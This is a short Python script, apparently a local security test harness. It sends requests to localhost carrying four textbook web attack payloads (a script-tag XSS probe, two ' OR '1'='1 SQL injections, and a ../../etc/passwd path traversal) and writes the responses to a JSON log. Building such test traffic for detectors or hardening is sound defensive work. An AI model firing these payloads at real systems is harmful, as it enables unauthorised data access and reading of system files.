import requests
import json

attacks = [
    "http://localhost/search?q=<script>alert(1)</script>",
    "http://localhost/admin?user=admin' OR '1'='1",
    "http://localhost/download?file=../../etc/passwd",
    "http://localhost/login?username=admin&password=' OR '1'='1"
]

results = []
for url in attacks:
    try:
        response = requests.get(url)
        results.append({
            "url": url,
            "status": response.status_code,
            "body": response.text[:200]  # Optional: truncate for readability
        })
    except Exception as e:
        results.append({
            "url": url,
            "error": str(e)
        })

with open("logs/injected_attacks.json", "w") as f:
    json.dump(results, f, indent=2)
